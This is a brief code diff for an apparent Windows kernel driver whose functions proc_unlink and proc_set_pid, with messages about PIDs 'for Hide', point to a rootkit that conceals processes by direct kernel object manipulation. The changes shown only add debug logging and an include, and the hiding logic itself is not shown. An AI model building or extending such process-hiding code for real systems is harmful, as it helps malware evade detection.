@@ -1,10 +1,13 @@
 #include "dkom.h"
+#include "ioctl.h"
 
 NTSTATUS proc_unlink(PUINT32 procid)
 {
         UINT32 pid = *procid;
-        if (!pid)
+        if (!pid) {
+                DbgPrint(DRIVER_PREFIX "invalid PID for Hide.");
                 return STATUS_SUCCESS;
+        }
 
         PEPROCESS curr_proc = PsGetCurrentProcess();
 
@@ -33,8 +36,10 @@ NTSTATUS proc_unlink(PUINT32 procid)
 NTSTATUS proc_set_pid(PUINT32 procid)
 {
         UINT32 pid = *procid;
-        if (!pid)
+        if (!pid) {
+                DbgPrint(DRIVER_PREFIX "invalid PID for Set.");
                 return STATUS_SUCCESS;
+        }
 
         PEPROCESS curr_proc = PsGetCurrentProcess();
 
